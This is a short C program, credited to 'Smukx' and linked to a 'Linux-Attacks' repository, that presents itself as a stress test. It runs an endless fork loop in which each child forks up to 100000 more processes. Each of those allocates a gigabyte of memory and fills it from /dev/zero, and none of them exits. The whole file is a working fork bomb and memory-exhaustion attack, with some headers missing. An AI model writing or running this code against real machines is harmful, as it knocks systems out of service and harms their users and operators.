#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  while (1) {
    pid_t pid = fork();
    if (pid == 0) {
      for (int i = 0; i < 100000; i++) {
        pid_t pid2 = fork();
        if (pid2 == 0) {
          int fd = open("/dev/zero", O_RDONLY);
          char *buf = malloc(1024 * 1024 * 1024);
          read(fd, buf, 1024 * 1024 * 1024);
          free(buf);
          close(fd);
        } else {
          wait(NULL);
        }
      }
    } else if (pid > 0) {
      wait(NULL);
    } else {
      perror("fork");
      exit(1);
    }
  }
  return 0;
}

// Coded By Smukx . For More info visit https://github.com/Linux-Attacks manual-stress.c
